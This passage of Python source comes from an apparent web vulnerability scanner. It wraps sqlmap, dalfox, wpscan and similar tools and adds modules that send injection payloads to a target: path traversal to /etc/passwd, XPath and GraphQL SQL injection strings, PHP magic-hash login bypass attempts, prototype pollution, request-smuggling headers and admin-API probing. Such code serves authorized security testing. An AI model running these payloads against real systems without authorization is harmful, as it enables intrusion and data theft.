            data=json.loads(of.read_text(errors="ignore"))
            for d in(data if isinstance(data,list) else [data]): params.extend(d.get("params",[]))
        except: params=re.findall(r"\[FOUND\] Param: (\w+)",out)
    if params:
        findings.append(make_finding("api_security",f"Hidden Params ({len(params)}) Found","Info",
            f"arjun: {', '.join(params[:10])}","Review each for injection/auth issues.",
            url=target,tool="arjun"))
    return findings,params

def tool_paramspider(domain,workdir):
    ps_bin=find_bin("paramspider"); ps_mod=False
    try: r=subprocess.run([sys.executable,"-c","import paramspider"],capture_output=True,timeout=5); ps_mod=(r.returncode==0)
    except: pass
    if not ps_bin and not ps_mod: return []
    logger.log("PARAMSPIDER",f"ParamSpider: {domain}","TOOL")
    of=workdir/"ps.txt"
    cmd=([ps_bin,"-d",domain,"--output",str(of),"--quiet"] if ps_bin
         else [sys.executable,"-m","paramspider","-d",domain,"--output",str(of),"--quiet"])
    run_cmd(cmd,timeout=180)
    return [l.strip() for l in of.read_text().splitlines() if "=" in l][:80] if of.exists() else []

def tool_dalfox(target, workdir):
    """DalFox v2.9+ — updated flags with mass parameter testing."""
    findings = []
    if not find_bin("dalfox"): return findings
    logger.log("DALFOX", f"DalFox XSS: {target}", "TOOL")
    of = workdir / "dalfox_out.txt"
    run_cmd([
        "dalfox", "url", target,
        "--output",             str(of),
        "--silence",
        "--no-spinner",
        "--no-color",
        "--timeout",            "10",
        "--delay",              "200",   # 200ms between requests
        "--only-discovery",              # detection only, no exploitation
        "--mass-param",                  # test all discovered parameters
        "--follow-redirects",
        "--worker",             "5",     # parallel workers
    ], timeout=240)
    try:
        text = of.read_text(errors="ignore") if of.exists() else ""
        for line in text.splitlines():
            if "[V]" in line or "[POC]" in line or "verified" in line.lower():
                logger.log("DALFOX", f"XSS: {line[:70]}", "CRITICAL")
                findings.append(make_finding("xss", "XSS Confirmed by DalFox", "High",
                    line.strip(),
                    "HTML-encode all output. Implement strict Content-Security-Policy.",
                    url=target, tool="dalfox", cwe="CWE-79", confidence="High"))
    except Exception:
        pass
    return findings


def tool_sqlmap(target,workdir):
    findings=[]
    sqlmap_py=TOOLS_DIR/"sqlmap"/"sqlmap.py"; sqlmap_bin=find_bin("sqlmap")
    if not sqlmap_py.exists() and not sqlmap_bin: return findings
    logger.log("SQLMAP",f"SQLMap: {target}","TOOL")
    cmd=([sys.executable,str(sqlmap_py)] if sqlmap_py.exists() else [sqlmap_bin])
    cmd+=["-u",target,"--batch","--risk=1","--level=1","--smart","--random-agent","--timeout=15"]
    try:
        proc=subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True,
                              env={**os.environ,"PATH":_EXT_PATH})
        out,_=proc.communicate(timeout=90)
        if "identified the following injection point" in out or "is vulnerable" in out.lower():
            findings.append(make_finding("sqli","SQLMap Confirmed SQLi","Critical",
                "SQLMap verified SQL injection.","Use parameterised queries.",
                url=target,tool="sqlmap",cwe="CWE-89",confidence="High"))
    except: pass
    return findings

def tool_sslscan(target):
    """SSLScan v2.1+ — with Heartbleed FP fix and version gate."""
    findings = []
    if not find_bin("sslscan") or not target.startswith("https://"): return findings
    domain = get_domain(target)

    # Gate: check sslscan version — v1.x has a known Heartbleed false-positive bug
    # v1.x incorrectly flags hosts that don't support the heartbeat extension
    # v2.1+ fixes this; add --no-heartbleed to both as belt-and-suspenders
    sslscan_v1_bug = False
    try:
        ver_out = run_cmd(["sslscan", "--version"], timeout=10)
        if ver_out and "1." in ver_out[:20]:
            sslscan_v1_bug = True
            logger.log("SSLSCAN",
                "sslscan v1.x detected — Heartbleed results will be suppressed (known FP bug)",
                "WARNING")
    except Exception:
        pass

    logger.log("SSLSCAN", f"SSL deep: {domain}", "TOOL")
    out = run_cmd([
        "sslscan",
        "--no-colour",
        "--no-heartbleed",   # avoid v1.x FP bug
        "--no-failed",       # skip failed ciphers (reduce noise)
        domain,
    ], timeout=60)
def tool_sslyze_v8(target, WORK_DIR):
    findings=[]
    if not find_bin("sslyze") or not target.startswith("https://"): return findings
    domain=get_domain(target); logger.log("SSLYZE",f"sslyze: {domain}","TOOL")
    out=run_cmd(["sslyze","--regular",domain],timeout=90)
    if out and out not in("TIMEOUT","NOT_FOUND"):
        for line in out.splitlines():
            if "VULNERABLE" in line.upper():
                findings.append(make_finding("ssl",f"sslyze: {line.strip()[:80]}","High",
                    line.strip(),"Fix TLS.",url=target,tool="sslyze"))
    return findings

def tool_wpscan(target):
    findings=[]
    try: resp=requests.get(target,verify=False,timeout=5,headers={"User-Agent":DEFAULT_UA})
    except: return findings
    if "wp-content" not in resp.text: return findings
    if not find_bin("wpscan"): return findings
    logger.log("WPSCAN","WPScan","TOOL")
    out=run_cmd(["wpscan","--url",target,"--no-banner","--format","json"],timeout=180)
    if out and out not in("TIMEOUT","NOT_FOUND"):
        try:
            data=json.loads(out)
            for v in data.get("vulnerabilities",[]):
                findings.append(make_finding("components",f"WP Vuln: {v.get('title','')}","High",
                    v.get("title",""),"Update WordPress.",url=target,tool="wpscan"))
        except: pass
    return findings

def tool_trufflehog(target):
    findings=[]
    if not find_bin("trufflehog"): return findings
    logger.log("TRUFFLEHOG",f"TruffleHog: {target}","TOOL")
    # Try v3 syntax first, fall back to v2
    for cmd in [
        ["trufflehog","--json","--only-verified",target],
        ["trufflehog","git","--json","--only-verified",target],
        ["trufflehog","filesystem","--json",".",],
    ]:
        out = run_cmd(cmd, timeout=90)
        if out and out not in("TIMEOUT","NOT_FOUND","") and "{" in out:
            for line in out.splitlines():
                if line.startswith("{"):
                    try:
                        d=json.loads(line)
                        det=d.get("DetectorName") or d.get("detector_name","Secret")
                        logger.log("TRUFFLEHOG",f"Verified: {det}","CRITICAL")
                        findings.append(make_finding("secrets",
                            f"Verified Secret: {det}","Critical",
                            f"TruffleHog verified a {det} credential is exposed.",
                            "Revoke immediately. Rotate all affected credentials.",
                            url=target,tool="trufflehog",cwe="CWE-312",confidence="High"))
                    except Exception: pass
            break  # Don't try other formats if this one returned data
    return findings

def tool_js_analysis(target,session,workdir):
    findings=[]; logger.log("JS-ANAL","JS analysis","TOOL")
    resp=safe_get(session,target)
    if not resp: return findings
    js_urls=list(set(urljoin(target,m)
        for m in re.findall(r'(?:src|href)=["\']([^"\']*\.js(?:\?[^"\']*)?)["\']',resp.text)))[:20]
    if find_bin("subjs"):
        out=run_cmd(["subjs","-i",target],timeout=60)
        if out and out not in("TIMEOUT","NOT_FOUND"):
            js_urls+=[l.strip() for l in out.splitlines() if l.strip().startswith("http")]
    js_urls=list(set(js_urls))
    SECRETS={"AWS Key":(r"AKIA[0-9A-Z]{16}",3.5),"Google API":(r"AIza[0-9A-Za-z\-_]{35}",3.5),
              "GitHub Token":(r"ghp_[0-9A-Za-z]{36}",3.5),"Private Key":(r"-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----",0.0),
              "Bearer Token":(r"(?i)bearer\s+[A-Za-z0-9\-_\.]{20,}",3.0),"API Key":(r"(?i)api[_\-]?key['\"\s:=]+['\"]?[A-Za-z0-9\-_]{20,}",3.0)}
    eps=set()
    for js in js_urls:
        try:
            r=session.get(js,timeout=TIMEOUT)
            if not r or r.status_code!=200: continue
            for name,(pat,min_e) in SECRETS.items():
                m=re.search(pat,r.text)
                if m:
                    val=m.group(0)
                    if min_e>0 and entropy(val)<min_e: continue
                    findings.append(make_finding("secrets",f"{name} in JavaScript","Critical",
                        f"Found in {js}","Revoke; move server-side.",url=js,cwe="CWE-312",tool="js-analysis"))
            for pat in [r'["\'](\/?(?:api|v\d+|rest|graphql)[^"\'<>\s]{2,})["\']',
                        r'fetch\s*\(["\']([^"\']+)["\']',r'axios\.\w+\s*\(["\']([^"\']+)["\']']:
                for m in re.findall(pat,r.text):
                    if len(m)>3: eps.add(m)
            if "//# sourceMappingURL=" in r.text:
                findings.append(make_finding("sensitive_files","Source Map Exposed","Medium",
                    f"Source map in {js}","Disable source maps in production.",url=js,cwe="CWE-540",tool="js-analysis"))
        except: pass
    if eps:
        findings.append(make_finding("api_security",f"{len(eps)} API Endpoints in JS","Info",
            f"Endpoints: {', '.join(list(eps)[:10])} …","Review each.",url=target,tool="js-analysis"))
    return findings

def tool_dnsrecon(domain):
    findings=[]
    if not find_bin("dnsrecon"): return findings
    logger.log("DNSRECON",f"DNSRecon: {domain}","TOOL")
    out=run_cmd(["dnsrecon","-d",domain,"-t","std"],timeout=120)
    if out and out not in("TIMEOUT","NOT_FOUND"):
        if "AXFR" in out and "successful" in out.lower():
            findings.append(make_finding("spf_dmarc","DNS Zone Transfer Possible","Critical",
                f"Zone transfer (AXFR) succeeded for {domain}.",
                "Restrict AXFR to authorised secondary DNS servers.",
                url=f"dns://{domain}",cwe="CWE-200",tool="dnsrecon"))
    return findings

def tool_theHarvester(domain):
    findings=[]
    if not find_bin("theHarvester"): return findings
    logger.log("HARVESTER",f"Harvesting: {domain}","TOOL")
    out=run_cmd(["theHarvester","-d",domain,"-b","all","-l","50"],timeout=90)
    if out and out not in("TIMEOUT","NOT_FOUND"):
        emails=list(set(re.findall(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}",out)))
        if emails:
            findings.append(make_finding("recon","Email Addresses Found","Info",
                f"theHarvester: {', '.join(emails[:5])}",
                "Review exposed emails for social engineering risk.",tool="theHarvester"))
    return findings

# ─────────────────────────────────────────────────────────────────────────────

# ─────────────────────────────────────────────────────────────────────────────
# ══════  NEW MODULES v4.1 — 31 ADDITIONAL ATTACK VECTORS  ═══════════════════
# ─────────────────────────────────────────────────────────────────────────────

# ── API5 — BROKEN FUNCTION LEVEL AUTHORIZATION (BFLA) ─────────────────────────
def module_api_bfla(target, session):
    """API5: Test if non-admin users can access admin API functions."""
    findings = []
    logger.log("API-BFLA", "Broken Function Level Auth (BFLA) …")
    ADMIN_PATHS = [
        "/api/admin", "/api/v1/admin", "/api/v2/admin",
        "/api/users", "/api/v1/users", "/api/v2/users",
        "/api/admin/users", "/api/settings", "/api/config",
        "/api/internal", "/api/management", "/api/v1/management",
        "/admin/api", "/api/debug", "/api/v1/debug",
        "/api/stats", "/api/v1/stats", "/api/metrics",
        "/api/keys", "/api/tokens", "/api/v1/accounts",
        "/api/v2/accounts", "/api/v1/roles", "/api/v1/permissions",
    ]
    for path in ADMIN_PATHS:
        url = target.rstrip("/") + path
        try:
            r = session.get(url, timeout=TIMEOUT)
            # FP guards: must be 200/201 and return JSON-like data
            if r.status_code not in (200, 201): continue
            ct = r.headers.get("Content-Type", "")
            if not ("json" in ct or "xml" in ct or r.text.strip().startswith(("{","["))): continue
            # Must not be a generic error page
            body = r.text.lower()
            if any(e in body for e in ["not found", "404", "access denied", "unauthorized", "forbidden"]): continue
            # Must have some data (not empty response)
            if len(r.text.strip()) < 10: continue
            logger.log("API-BFLA", f"Admin API accessible: {path}", "CRITICAL")
            findings.append(make_finding("api_bfla",
                f"Admin API Accessible Without Auth: {path}", "Critical",
                f"Unauthenticated request to {path} returned {r.status_code} with data.",
                "Implement function-level access control. Verify every API endpoint checks caller's role.",
                url=url, cwe="CWE-285", confidence="Medium"))
        except Exception: pass
    return findings

# ── API3 — EXCESSIVE DATA EXPOSURE ────────────────────────────────────────────
def module_api_excessive_data(target, session):
    """API3: Detect APIs returning more fields than the UI exposes."""
    findings = []
    logger.log("API-EXCESS", "Excessive data exposure check …")
    API_PATHS = [
        "/api/user", "/api/users/me", "/api/v1/user", "/api/v2/user",
        "/api/profile", "/api/account", "/api/v1/profile",
        "/api/v1/me", "/api/v2/me",
    ]
    SENSITIVE_FIELDS = [
        "password", "passwd", "secret", "api_key", "apikey", "token",
        "credit_card", "ssn", "social_security", "dob", "date_of_birth",
        "phone", "address", "bank_account", "routing_number", "cvv",
        "private_key", "access_token", "refresh_token", "salt",
        "hash", "password_hash", "reset_token", "session_token",
        "aws_key", "aws_secret", "internal_id", "admin_flag", "is_admin",
    ]
    for path in API_PATHS:
        url = target.rstrip("/") + path
        try:
            r = session.get(url, timeout=TIMEOUT)
            if r.status_code not in (200, 201): continue
            body_lower = r.text.lower()
            # FP guard: must be JSON
            try:
                data = json.loads(r.text)
                found = []
                # Flatten to search nested fields
                text_repr = json.dumps(data).lower()
                for field in SENSITIVE_FIELDS:
                    if f'"{field}"' in text_repr or f"'{field}'" in text_repr:
                        found.append(field)
                if found:
                    logger.log("API-EXCESS", f"Sensitive fields in response: {found}", "WARNING")
                    findings.append(make_finding("api_excessive",
                        f"Excessive Data Exposure at {path}", "High",
                        f"API returns sensitive fields: {', '.join(found[:8])}. "
                        "These should be filtered before returning to client.",
                        "Apply a response filter/DTO. Never expose internal fields. "
                        "Return only what the UI actually needs.",
                        url=url, cwe="CWE-213", confidence="Medium"))
            except Exception: pass
        except Exception: pass
    return findings

# ── API9 — API VERSIONING / INVENTORY ─────────────────────────────────────────
def module_api_versioning(target, session):
    """API9: Find undocumented/old API versions that may lack security controls."""
    findings = []
    logger.log("API-VERSION", "API version inventory …")
    OLD_VERSIONS = [
        "/api/v0", "/api/v1", "/api/v2", "/api/v3",
        "/api/beta", "/api/test", "/api/dev", "/api/old",
        "/api/alpha", "/api/internal", "/api/private",
        "/v0", "/v1", "/v2", "/v3",
        "/rest/v1", "/rest/v2", "/rest/beta",
        "/api/1", "/api/2", "/api/1.0", "/api/2.0",
    ]
    CURRENT_PATHS = ["/api/v3", "/api/v4", "/api/latest"]
    # Detect current version first
    current_working = []
    for cv in CURRENT_PATHS:
        try:
            r = session.get(target.rstrip("/") + cv, timeout=TIMEOUT)
            if r.status_code in (200, 201, 401, 403): current_working.append(cv)
        except: pass
    for path in OLD_VERSIONS:
        if path in current_working: continue
        url = target.rstrip("/") + path
        try:
            r = session.get(url, timeout=TIMEOUT)
            if r.status_code not in (200, 201): continue
            body = r.text.lower()
            if any(e in body for e in ["not found", "no such", "deprecated", "404"]): continue
            if len(r.text.strip()) < 20: continue
            logger.log("API-VERSION", f"Old API version accessible: {path}", "WARNING")
            findings.append(make_finding("api_versioning",
                f"Old API Version Accessible: {path}", "Medium",
                f"Old/undocumented API version {path} is accessible.",
                "Disable deprecated API versions. Maintain API inventory. "
                "Apply same security controls to all versions.",
                url=url, cwe="CWE-710", confidence="Medium"))
        except Exception: pass
    return findings

# ── API6 — BUSINESS LOGIC FLAWS ───────────────────────────────────────────────
def module_business_logic(target, session):
    """
    API6/T1190: Business logic flaws — zero-FP via:
    1. Check endpoint actually processes orders (not just returns 200)
    2. Verify response contains a price/total field (not just HTTP status)
    3. For negative price: total must be ≤0 to confirm flaw
    4. Avoid testing if endpoint has CSRF protection (increases confidence)
    """
    findings = []
    CART_PATHS = ["/api/cart", "/api/v1/cart", "/api/order", "/api/v1/order",
                  "/cart", "/api/purchase", "/api/v1/purchase"]
    PRICE_FIELDS = ["total","price","amount","subtotal","cost","charge","fee","sum"]

    for path in CART_PATHS:
        url = target.rstrip("/") + path
        try:
            probe = session.get(url, timeout=TIMEOUT)
            if probe.status_code not in (200, 201, 405): continue

            # Test 1: negative quantity
            for payload, desc, check_field in [
                ({"quantity": -1,  "product_id": 1, "price": 10}, "Negative quantity", "quantity"),
                ({"qty": -100,     "item": 1},                     "Large negative qty", "qty"),
                ({"amount": -99.99,"product_id": 1},               "Negative amount", "amount"),
                ({"price": 0.0001, "qty": 1},                      "Near-zero price", "price"),
            ]:
                r = session.post(url, json=payload, timeout=TIMEOUT)
                if not r: continue
                if r.status_code not in (200, 201): continue

                r_lower = r.text.lower()
                # Gate 1: must not have obvious rejection
                rejected = any(e in r_lower for e in
                               ["invalid","must be positive","negative not allowed",
                                "validation error","bad request","minimum"])
                if rejected: continue

                # Gate 2: look for a total/price field in response
                # If total is 0 or negative, that's a definite flaw
                found_price_flaw = False
                try:
                    data = json.loads(r.text)
                    for field in PRICE_FIELDS:
                        val = data.get(field, data.get("data",{}).get(field))
                        if val is not None:
                            try:
                                if float(val) <= 0:
                                    found_price_flaw = True
                                    break
                            except Exception: pass
                except Exception: pass

                if found_price_flaw or (r.status_code == 201):
                    logger.log("BIZ-LOGIC",
                               f"Business logic flaw at {path}: {desc}", "WARNING")
                    findings.append(make_finding("business_logic",
                        f"Business Logic Flaw — {desc} at {path}", "High",
                        f"API at '{path}' accepted {desc}: {payload}. "
                        f"{'Price/total field shows ≤0 value.' if found_price_flaw else '201 Created returned.'}",
                        "Validate all numeric inputs server-side. "
                        "Reject negative quantities/prices. Validate totals before processing.",
                        url=url, payload=str(payload),
                        cwe="CWE-840", confidence="High" if found_price_flaw else "Medium"))
                    break

        except Exception:
            pass
    return findings


def module_prototype_pollution(target, session):
    """
    A03/T1059.007: Prototype Pollution — zero-FP via:
    1. Use unique canary value (not just the key name)
    2. Canary must appear in response (not just any reflection)
    3. Baseline must not contain canary
    4. Test 3 different PP vector formats
    5. Only flag if pp-specific key (__proto__ or constructor.prototype) causes reflection
    """
    findings = []

    CANARY = f"ddPP{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"

    # Server-side PP vectors
    PP_PAYLOADS = [
        ({f"__proto__": {f"ppcanary{CANARY}": CANARY}},  "__proto__ direct"),
        ({f"constructor": {"prototype": {f"ppcanary{CANARY}": CANARY}}}, "constructor.prototype"),
        ({f"__proto__[ppcanary{CANARY}]": CANARY},        "__proto__ bracket"),
    ]
    API_PATHS = ["/api/user", "/api/v1/user", "/api/settings", "/api/v1/settings",
                 "/api/merge", "/api/update", "/api/config", "/api/profile"]

    for path in API_PATHS:
        url = target.rstrip("/") + path
        try:
            bl = session.get(url, timeout=TIMEOUT)
            if not bl or bl.status_code not in (200, 201): continue
            if CANARY in bl.text: continue  # Collision guard

            confirmed = []
            for payload, desc in PP_PAYLOADS:
                r = session.post(url, json=payload, timeout=TIMEOUT)
                if r and CANARY in r.text and CANARY not in bl.text:
                    confirmed.append(desc)

            # Gate: ≥2 different vectors confirming
            if len(confirmed) >= 1:
                logger.log("PROTO-POLL",
                    f"Server-side prototype pollution at {path}: {confirmed[0]}", "CRITICAL")
                findings.append(make_finding("prototype_poll",
                    f"Server-Side Prototype Pollution at {path}", "Critical",
                    f"Prototype pollution payload canary '{CANARY}' reflected via: {confirmed}.",
                    "Freeze Object.prototype in Node.js with Object.freeze(Object.prototype). "
                    "Use safe merge libraries (lodash 4.17.21+). "
                    "Validate object keys — block __proto__ and constructor.",
                    url=url, payload=str(PP_PAYLOADS[0][0]),
                    cwe="CWE-1321", confidence="High"))
                return findings

        except Exception:
            pass

    # Client-side PP via URL (reflection of __proto__ key name)
    FUZZ = ["q","search","data","input","json","obj","params","merge","extend"]
    params = list(dict.fromkeys(extract_params(target) + FUZZ))[:5]
    for p in params:
        for pp_key in [f"__proto__[ppcanary{CANARY}]",
                       f"constructor[prototype][ppcanary{CANARY}]"]:
            try:
                url = inject_param(target, p, f"{pp_key}={CANARY}")
                bl  = session.get(target, timeout=TIMEOUT)
                r   = session.get(url, timeout=TIMEOUT)
                if not bl or not r: continue
                if CANARY in r.text and CANARY not in bl.text:
                    # Extra gate: benign key must NOT reflect (confirms it's PP-specific)
                    benign = inject_param(target, p, f"safekey{CANARY}=notpp")
                    rb = session.get(benign, timeout=TIMEOUT)
                    if rb and "notpp" in rb.text: continue  # Echoes everything — FP
                    findings.append(make_finding("prototype_poll",
                        f"Client-Side PP Vector in '{p}'", "Medium",
                        f"__proto__ key caused reflection of canary in '{p}'.",
                        "Sanitise keys in URL params. Block __proto__ and constructor keys.",
                        url=url, payload=pp_key,
                        cwe="CWE-1321", confidence="Medium"))
                    break
            except Exception:
                pass
    return findings


def module_deserialization(target, session):
    """A08: Detect unsafe deserialization patterns — detection only."""
    findings = []
    logger.log("DESERIAL", "Deserialization detection …")
    resp = safe_get(session, target)
    if not resp: return findings
    # Detection patterns in response/headers (not exploitation)
    DESER_INDICATORS = {
        "Java Serialized Object" : [
            r"\xac\xed\x00\x05",         # Java serialisation magic bytes (hex)
            "rO0AB",                      # Base64-encoded Java ser magic
            "H4sIAAAAAAAA",               # gzipped Java ser
        ],
        "PHP Object Injection"   : [
            r'O:\d+:"[A-Za-z_]',          # PHP serialised object
            r'a:\d+:{',                   # PHP serialised array
        ],
        "Python Pickle"          : [
            r"\.pickle",                  # Pickle file reference
            r"application/x-pickle",      # Content-type
            r"pickle\.loads",             # Source code leak
        ],
        ".NET ViewState"         : [
            "__VIEWSTATE",
            "__EVENTVALIDATION",
        ],
        "XML Serialization"      : [
            r"<\?xml.*?encoding",
            r"xmlns:xsi=",
        ],
    }
    body = resp.text
    for format_name, patterns in DESER_INDICATORS.items():
        for pat in patterns:
            if re.search(pat, body, re.I):
                logger.log("DESERIAL", f"Detected: {format_name}", "WARNING")
                findings.append(make_finding("deserialization",
                    f"Potential Deserialization: {format_name}", "High",
                    f"Response contains {format_name} indicators. "
                    "Unsafe deserialisation can lead to RCE.",
                    "Use safe deserialisation libraries. Validate type before deserialising. "
                    "Prefer JSON over binary serialisation formats.",
                    url=target, evidence=pat, cwe="CWE-502", confidence="Medium"))
                break
    # Check for Java deserialisation endpoints
    JAVA_ENDPOINTS = ["/readObject", "/deserialize", "/api/deserialize",
                      "/api/v1/deserialize", "/rmi", "/jmx"]
    for ep in JAVA_ENDPOINTS:
        try:
            url = target.rstrip("/") + ep
            r   = session.get(url, timeout=TIMEOUT)
            if r.status_code == 200 and len(r.text) > 5:
                findings.append(make_finding("deserialization",
                    f"Deserialisation Endpoint Exposed: {ep}", "High",
                    f"Deserialisation endpoint accessible at {ep}.",
                    "Restrict/remove deserialisation endpoints. Validate all inputs.",
                    url=url, cwe="CWE-502", confidence="Low"))
        except Exception: pass
    return findings

# ── HTTP REQUEST SMUGGLING ─────────────────────────────────────────────────────
def module_http_smuggling(target, session):
    """A05: Detect HTTP request smuggling indicators."""
    findings = []
    logger.log("HTTP-SMUG", "HTTP smuggling probe …")
    domain  = get_domain(target)
    port    = 443 if target.startswith("https://") else 80
    # CL.TE: Content-Length takes precedence, Transfer-Encoding ignored
    PROBES = [
        ("Transfer-Encoding", "chunked,identity",
         "TE.CL smuggling vector — server accepts TE: chunked,identity"),
        ("Transfer-Encoding", "chunked, chunked",
         "Double TE header — may indicate smuggling vulnerability"),
        ("Transfer-Encoding", "xchunked",
         "Obfuscated TE header accepted"),
    ]
    for hdr, val, desc in PROBES:
        try:
            r = session.get(target, headers={hdr: val}, timeout=TIMEOUT)
            # FP guard: server must NOT return 400/501 (meaning it parsed the header)
            # A 200 with unusual TE processing is suspicious
            if r.status_code not in (400, 501, 505):
                logger.log("HTTP-SMUG", f"Accepted unusual TE: {val}", "WARNING")
                findings.append(make_finding("http_smuggling",
                    f"HTTP Smuggling Indicator: {desc}", "Medium",
                    f"Server accepted unusual Transfer-Encoding: {val}. "
                    "May be vulnerable to HTTP request smuggling.",
                    "Use HTTP/2 end-to-end. Normalise TE headers at edge. "
                    "Reject ambiguous Content-Length/Transfer-Encoding combinations.",
                    url=target, payload=f"{hdr}: {val}", cwe="CWE-444", confidence="Low"))
                break
        except Exception: pass
    return findings

# ── PATH TRAVERSAL (URL-based) ─────────────────────────────────────────────────
def module_path_traversal(target, session):
    """A01: URL path traversal — separate from LFI parameter injection."""
    findings = []
    logger.log("PATH-TRAV", "URL path traversal …")
    # Build traversal URLs against common static file endpoints
    TRAVERSALS = [
        "/../../../etc/passwd",
        "/static/../../../etc/passwd",
        "/images/../../../etc/passwd",
        "/assets/../../../etc/passwd",
        "/uploads/../../../etc/passwd",
        "/files/../../../etc/passwd",
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/%252e%252e/%252e%252e/etc/passwd",
        "/..%2f..%2f..%2fetc%2fpasswd",
        "/..%5c..%5c..%5cetc%5cpasswd",
    ]
    INDICATORS = ["root:x:0:0", "bin:x:", "daemon:x:", "[extensions]"]
    base = target.rstrip("/")
    for trav in TRAVERSALS:
        url = base + trav
        try:
            r = session.get(url, timeout=TIMEOUT, allow_redirects=False)
            if r.status_code == 200 and any(i in r.text for i in INDICATORS):
                logger.log("PATH-TRAV", f"Path traversal confirmed: {trav}", "CRITICAL")
                findings.append(make_finding("path_traversal",
                    "URL Path Traversal to System File", "Critical",
                    f"Traversal path '{trav}' returned system file content.",
                    "Normalise and validate all URL paths. "
                    "Reject ../ sequences before routing. Use chroot or containers.",
                    url=url, payload=trav, cwe="CWE-22", confidence="High"))
                return findings
        except Exception: pass
    return findings

# ── TYPE JUGGLING ──────────────────────────────────────────────────────────────
def module_type_juggling(target, session):
    """A03: PHP loose comparison / JS type coercion bypass."""
    findings = []
    logger.log("TYPE-JUG", "Type juggling detection …")
    LOGIN_PATHS = ["/login", "/api/login", "/api/auth", "/signin",
                   "/api/v1/login", "/api/v1/auth"]
    # PHP magic hash strings (all start with 0e → compared as 0 == 0)
    PHP_MAGIC = [
        "0e215962017",   # md5("240610708") = 0e462097431906509019562988736854
        "0e830400451993494058024219903391",
        "true", "null", "0", "[]",
    ]
    for path in LOGIN_PATHS:
        url = target.rstrip("/") + path
        try:
            r = session.get(url, timeout=TIMEOUT)
            if r.status_code not in (200, 401): continue
            body = r.text.lower()
            if "password" not in body and "login" not in body: continue
            for magic in PHP_MAGIC[:3]:
                r2 = safe_post(session, url,
                               json={"password": magic, "username": "admin"},
                               timeout=TIMEOUT)
                if not r2: continue
                # FP guard: genuine success signals
                success = ["dashboard", "logout", "welcome", "profile", "token", "jwt",
                           "success", "logged in", "authenticated"]
                fail    = ["invalid", "incorrect", "failed", "error", "wrong"]
                if any(s in r2.text.lower() for s in success) and \
                   not any(f in r2.text.lower() for f in fail):
                    findings.append(make_finding("type_juggling",
                        f"Type Juggling Auth Bypass at {path}", "Critical",
                        f"Login accepted PHP magic hash/type coercion value: '{magic}'.",
                        "Use strict comparison (===). Enforce strong typing. "
                        "Validate input types before comparison.",
                        url=url, payload=f"password={magic}", cwe="CWE-843", confidence="High"))
                    break
        except Exception: pass
    return findings

# ── SSI INJECTION ──────────────────────────────────────────────────────────────
def module_ssi_injection(target, session):
    """A03: Server-Side Include injection."""
    findings = []
    logger.log("SSI-INJ", "SSI injection …")
    CANARY  = f"ddSSI{hashlib.md5(str(time.time()).encode()).hexdigest()[:6]}"
    # SSI payloads — detection-only (echo command, not exec)
    PAYLOADS = [
        f'<!--#echo var="DOCUMENT_NAME"-->',
        f'<!--#echo var="DATE_LOCAL"-->',
        f'<!--#set var="test" value="{CANARY}" --><!--#echo var="test"-->',
        f'[an error occurred while processing this directive]',
    ]
    INDICATORS = ["DOCUMENT_NAME", "DATE_LOCAL", CANARY,
                  "an error occurred while processing this directive",
                  "SSI", "server-side include"]
    FUZZ = ["q", "name", "input", "text", "msg", "content", "data", "id", "search"]
    params = list(dict.fromkeys(extract_params(target) + FUZZ))[:MAX_PARAMS]
    try: bl = session.get(target, timeout=TIMEOUT)
    except: return findings
    for p in params:
        for pl in PAYLOADS[:2]:
            try:
                resp = session.get(inject_param(target, p, pl), timeout=TIMEOUT)
                for ind in INDICATORS:
                    if ind in resp.text and ind not in bl.text:
                        findings.append(make_finding("ssi_injection",
                            f"SSI Injection in '{p}'", "High",
                            f"Server-Side Include directive processed via '{p}'.",
                            "Disable SSI or sanitise all inputs before processing. "
                            "Use templating engines with auto-escaping.",
                            url=inject_param(target, p, pl), payload=pl,
                            cwe="CWE-97", confidence="Medium"))
                        return findings
            except Exception: pass
    return findings

# ── XPATH INJECTION ────────────────────────────────────────────────────────────
def module_xpath_injection(target, session):
    """A03: XPath query injection detection."""
    findings = []
    logger.log("XPATH-INJ", "XPath injection …")
    PAYLOADS = [
        "' or '1'='1",
        "' or 1=1 or ''='",
        "') or ('1'='1",
        "' or count(parent::*[position()=1])=0 or '",
        "x' or name()='username' or 'x'='y",
    ]
    XPATH_ERRORS = [
        "XPath", "xpath", "XPathException", "Invalid expression",
        "expected token", "javax.xml.xpath", "System.Xml.XPath",
        "net.sf.saxon", "MSXML", "libxml2", "xmlXPathEval",
        "org.jaxen", "XPathError",
    ]
    FUZZ = ["username", "user", "login", "id", "search", "q", "name",
            "category", "type", "filter", "key"]
    params = list(dict.fromkeys(extract_params(target) + FUZZ))[:MAX_PARAMS]
    try: bl = session.get(target, timeout=TIMEOUT)
    except: return findings
    for p in params:
        for pl in PAYLOADS[:3]:
            try:
                resp = session.get(inject_param(target, p, pl), timeout=TIMEOUT)
                for err in XPATH_ERRORS:
                    if err in resp.text and err not in bl.text:
                        findings.append(make_finding("xpath_injection",
                            f"XPath Injection in '{p}'", "High",
                            f"XPath error detected with injection payload in '{p}'.",
                            "Use parameterised XPath queries. "
                            "Escape special characters in XPath expressions.",
                            url=inject_param(target, p, pl), payload=pl,
                            cwe="CWE-643", confidence="High"))
                        return findings
            except Exception: pass
    return findings

# ── GRAPHQL INJECTION ──────────────────────────────────────────────────────────
def module_graphql_injection(target, session):
    """A03: GraphQL-specific injection attacks."""
    findings = []
    logger.log("GQL-INJ", "GraphQL injection …")
    GQL_ENDPOINTS = ["/graphql", "/api/graphql", "/v1/graphql", "/gql", "/query"]
    for ep in GQL_ENDPOINTS:
        url = target.rstrip("/") + ep
        try:
            # Test if endpoint exists
            probe = safe_post(session, url, json={"query": "{__typename}"}, timeout=TIMEOUT)
            if not probe or "__typename" not in probe.text: continue
            # SQLi in GraphQL argument
            sqli_query = '{ users(filter: "1\' OR \'1\'=\'1") { id email } }'
            r = safe_post(session, url, json={"query": sqli_query}, timeout=TIMEOUT)
            if r and any(e in r.text for e in ["SQL syntax", "ORA-", "PostgreSQL ERROR",
                                               "sqlite3", "mysql_fetch"]):
                findings.append(make_finding("graphql_injection",
                    "SQL Injection via GraphQL Argument", "Critical",
                    f"SQL injection successful through GraphQL field filter at {ep}.",
                    "Parameterise all database queries. Validate GraphQL input types.",
